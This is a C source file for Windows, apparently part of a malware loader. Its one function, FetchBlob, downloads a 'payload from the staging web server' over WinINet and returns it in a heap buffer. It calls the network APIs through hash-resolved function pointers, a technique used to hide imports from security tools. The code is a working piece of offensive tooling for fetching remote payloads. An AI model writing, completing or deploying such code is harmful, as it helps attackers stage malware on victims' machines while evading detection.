#include "common.h"

#pragma comment(lib, "Wininet.lib")

// Retrieves payload from the staging web server
BOOL FetchBlob(
	IN		PH_API	pHashedApis,
	IN		LPCWSTR	lpszUrl,
	OUT		PBYTE* ppBlob,
	OUT		PSIZE_T	psBlobSize
) {
	BOOL bSTATE = TRUE;

	HINTERNET	hInternet = NULL;
	HINTERNET	hInternetFile = NULL;

	PBYTE		pBuffer = NULL;
	SIZE_T		sBufferSize = 0;

	DWORD		dwBytesRead = 0;

	BYTE		pTmpBuffer[4096];

	hInternet = pHashedApis->pInternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		DEBUG_PRINT("InternetOpenW failed with error: %lu\n", GetLastError());
		bSTATE = FALSE;
		goto _CleanUp;
	}

	hInternetFile = pHashedApis->pInternetOpenUrlW(
		hInternet,
		lpszUrl,
		NULL,
		NULL,
		INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE,
		NULL
	);

	if (hInternetFile == NULL) {
		DEBUG_PRINT("InternetOpenUrlW failed with error: %lu\n", GetLastError());
		bSTATE = FALSE;
		goto _CleanUp;
	}

	while (TRUE) {
		if (!pHashedApis->pInternetReadFile(hInternetFile, pTmpBuffer, sizeof(pTmpBuffer), &dwBytesRead)) {
			DEBUG_PRINT("InternetReadFile failed with error: %lu\n", GetLastError());
			bSTATE = FALSE;
			goto _CleanUp;
		}

		if (!(dwBytesRead > 0)) {
			break;
		}

		if (pBuffer == NULL)
			pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesRead);
		else
			pBuffer = (PBYTE)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pBuffer, sBufferSize + dwBytesRead);

		if (pBuffer == NULL) {
			DEBUG_PRINT("Failed to (re)allocate pBuffer. Last error: %lu\n", GetLastError());
			bSTATE = FALSE;
			goto _CleanUp;
		}

		memcpy(pBuffer + sBufferSize, pTmpBuffer, dwBytesRead);

		sBufferSize += dwBytesRead;
	}

	*ppBlob = pBuffer;
	*psBlobSize = sBufferSize;

_CleanUp:
	if (hInternetFile)
		pHashedApis->pInternetCloseHandle(hInternetFile);
	if (hInternet) {
		pHashedApis->pInternetCloseHandle(hInternet);
		pHashedApis->pInternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	}

	RtlSecureZeroMemory(pTmpBuffer, 4096);

	return bSTATE;
}
